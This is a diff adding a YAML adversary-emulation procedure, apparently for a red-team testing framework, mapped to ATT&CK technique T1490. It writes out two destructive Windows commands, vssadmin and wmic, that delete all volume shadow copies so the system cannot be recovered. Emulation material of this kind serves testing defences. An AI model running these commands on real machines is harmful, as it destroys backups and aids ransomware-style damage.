@@ -1,0 +1,24 @@
+id: 280f0330-e862-44b9-9a57-0459ef118c8d
+name: Delete volume shadow copies
+description: >-
+  This procedure will volume shadow copies to inhibt system recovery using
+  vssadmin.exe.
+tactic: impact
+technique:
+  id: T1490
+  name: Inhibit System Recovery
+platforms:
+  windows:
+    cmd:
+      command: |
+        vssadmin.exe delete shadows /all /quiet
+    psh:
+      command: |
+        wmic shadowcopy delete /nointeractive
+metadata:
+  authors:
+    - bfuzzy1
+    - w0rk3r
+  tags:
+    - destructive
+  version: 3
